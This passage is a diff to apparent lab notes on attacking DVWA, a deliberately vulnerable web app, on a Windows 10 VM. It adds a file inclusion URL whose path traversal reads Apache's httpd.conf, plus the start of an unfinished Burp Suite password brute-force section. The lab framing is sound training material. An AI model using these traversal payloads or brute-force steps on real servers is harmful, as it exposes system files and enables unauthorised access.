@@ -82,7 +82,26 @@ http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=file4.php
 ```
 
 ## File Inclusion
-- Change URL below to 
+- Change URL below to get non-existent page and get error to find full path of page
 ```
 http://Win10-IP/dvwa-master/vulnerabilities/fi/?page=include2.php
 ```
+
+- Find configuration file of Apache Web Server
+```
+http://Win-10/dvwa-master/vulnerabilities/fi/?page=..\..\..\..\apache\conf\httpd.conf
+```
+
+## Using Burp Suite to Brute Force Passwords
+- Launch Burp Suite
+```
+sudo burpsuite
+```
+
+- Go to DVWA browser on Win10 VM
+```
+
+```
+
+- Configure proxy in FireFox browser
+- Go to **Proxy** tab and 
